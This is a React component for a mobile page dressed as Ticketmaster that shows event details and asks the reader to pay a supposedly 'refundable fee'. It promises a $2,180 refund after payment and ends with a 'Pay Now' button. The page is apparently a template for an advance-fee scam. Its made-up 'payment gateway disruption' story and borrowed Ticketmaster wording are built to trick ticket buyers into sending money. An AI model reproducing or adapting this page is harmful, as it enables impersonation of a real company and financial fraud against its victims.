import React from "react";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faBarChart, faBars, faClock, faLocation, faLocationDot, faSearch, faTimes, faUserCircle } from '@fortawesome/free-solid-svg-icons';
import '../App.css';
import image from "../component images/center.jpg"




const Security = ({event, info}) => {

    document.querySelector('meta[name="theme-color"]').content = '#121212'


    return (
        <div className="security">
        <div className="pass">
            <div>
                <FontAwesomeIcon icon={faBars}/>
            </div>
            <div className="search_icon">
            <div>
                <FontAwesomeIcon icon={faSearch}/>
            </div>
           <div>
           <FontAwesomeIcon icon={faUserCircle}/>
           </div>
            </div>
           <div>

           </div>
        </div>
        <div className="sbody">
            <h1>{event.location}</h1>
            <p>
            Due to a technical issue at the {event.location} box office, a temporary disruption in our payment gateway has incurred a refundable fee of <span>{info.currency}{info.feeamount}</span>. This fee is fully refundable and, upon receipt of payment, a total refund of <b>$2,180</b> will be credited to the recipient's card.
            </p>
            <img src={image} alt="Image" loading="lazy"/>
        </div>
        <div className="sfooter">
            <p>{event.day}, {event.date} {event.year}</p>
            <p><FontAwesomeIcon icon={faClock} className="sclock"/> {event.time}</p>
            <p>{info.lineup1}</p>
            <p>
                <FontAwesomeIcon icon={faLocationDot} className="sclock"/>
                {event.location}, {event.state}
            </p>
            <p><span>Fee Amount</span> <span>{info.currency}{info.feeamount}</span></p>
            <hr />
            <div>
                <p>
                Sharing your data allows Ticketmaster to personalize the app for you and improve your ticket buying and selling experience.
                </p>
                <p>To proceed with fee payment tap on "Pay Now" below</p>
                <button>Pay Now</button>
            </div>
        </div>
        </div>
    )
}


export default Security;